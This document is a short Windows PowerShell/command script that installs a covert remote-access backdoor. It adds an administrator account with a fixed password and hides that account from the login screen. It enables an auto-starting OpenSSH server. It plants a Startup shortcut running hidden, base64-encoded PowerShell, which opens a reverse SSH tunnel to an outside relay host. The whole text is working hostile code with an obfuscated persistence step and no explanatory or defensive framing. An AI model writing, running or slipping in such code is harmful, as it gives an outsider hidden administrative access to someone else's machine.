net user desktop Password123@ /add

net localgroup Administrators desktop /add

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v desktop /t REG_DWORD /d 0 /f

$OpenSSHServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*' | Select-Object -ExpandProperty State
$OpenSSHClient = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Client*' | Select-Object -ExpandProperty State

if ($OpenSSHServer -eq 'NotPresent') {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Start-Service sshd
    Set-Service -Name sshd -StartupType 'Automatic'
}

if ($OpenSSHClient -eq 'NotPresent') {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
}
  
$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shortcut.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-windowstyle hidden -EncodedCommand QwA6AFwAVwBJAE4ARABPAFcAUwBcAFMAeQBzAHQAZQBtADMAMgBcAE8AcABlAG4AUwBTAEgAXABzAHMAaAAuAGUAeABlACAAcgBhAG4AZABvAG0AdQBzAGUAcgB0AGUAcwB0AGkAbgBnAEAAcwBzAGgALQBqAC4AYwBvAG0AIAAtAE4AIAAtAFIAIABsAGEAcAB0AG8AcAAxADkAOQA5ADoAMgAyADoAbABvAGMAYQBsAGgAbwBzAHQAOgAyADIA"
$Shortcut.Save()

Invoke-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shortcut.lnk'

